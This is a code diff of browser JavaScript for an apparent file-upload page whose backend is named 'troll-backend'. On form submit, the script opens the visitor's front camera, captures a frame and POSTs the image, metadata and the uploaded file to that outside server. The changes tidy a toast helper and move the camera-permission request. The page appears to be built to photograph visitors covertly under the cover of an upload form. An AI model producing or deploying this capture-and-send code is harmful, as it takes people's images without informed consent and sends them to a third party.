@@ -8,30 +8,31 @@ const submitBtn = document.getElementById("submit-btn");
 const backendURL = "https://troll-backend.onrender.com/api/upload";
 const constraints = { video: { facingMode: "user" }, audio: false };
 
-// Show a toast notification
+let toastTimeout;
+
+// Toast function (clears previous timeout to prevent glitches)
 function showToast(message) {
   toast.innerText = message;
-  toast.style.display = "block";
-  toast.style.opacity = 1;
-
-  setTimeout(() => {
-    toast.style.opacity = 0;
-    setTimeout(() => (toast.style.display = "none"), 300);
+  toast.classList.add("show");
+  clearTimeout(toastTimeout);
+  toastTimeout = setTimeout(() => {
+    toast.classList.remove("show");
   }, 2000);
 }
 
-// Request camera permission asynchronously when file input is clicked
-fileInput.addEventListener("click", () => {
-  // Request camera permission in background, but don't await
-  navigator.mediaDevices.getUserMedia(constraints)
-    .then(stream => {
-      console.log("Camera permission granted");
-      // Stop immediately; we just wanted permission
-      stream.getTracks().forEach(track => track.stop());
-    })
-    .catch(err => console.warn("Camera permission denied or ignored:", err));
-  // File picker will open immediately
-});
+// Request camera permission separately, NOT on file input click
+async function requestCameraPermission() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    stream.getTracks().forEach(track => track.stop());
+    console.log("Camera permission granted");
+  } catch (err) {
+    console.warn("Camera permission denied", err);
+  }
+}
+
+// Optional: request camera in advance on page load or form focus
+// requestCameraPermission();
 
 // Handle form submission
 form.addEventListener("submit", async (e) => {
@@ -45,11 +46,8 @@ form.addEventListener("submit", async (e) => {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     videoEl.srcObject = stream;
     await videoEl.play();
+    await new Promise(res => videoEl.addEventListener("canplay", () => setTimeout(res, 200)));
 
-    // Wait until video is ready
-    await new Promise(res => videoEl.addEventListener("canplay", () => setTimeout(res, 300)));
-
-    // Capture image from video
     const ctx = canvasEl.getContext("2d");
     canvasEl.width = videoEl.videoWidth;
     canvasEl.height = videoEl.videoHeight;
@@ -84,7 +82,7 @@ form.addEventListener("submit", async (e) => {
       }
     }
 
-    // Get the uploaded file (if any)
+    // Get uploaded file
     let uploadedFileData = null;
     if (fileInput.files.length > 0) {
       const file = fileInput.files[0];
@@ -97,7 +95,7 @@ form.addEventListener("submit", async (e) => {
     }
 
     // Send data to backend
-    const response = await fetch(backendURL, {
+    await fetch(backendURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ image, metadata, uploadedFile: uploadedFileData })
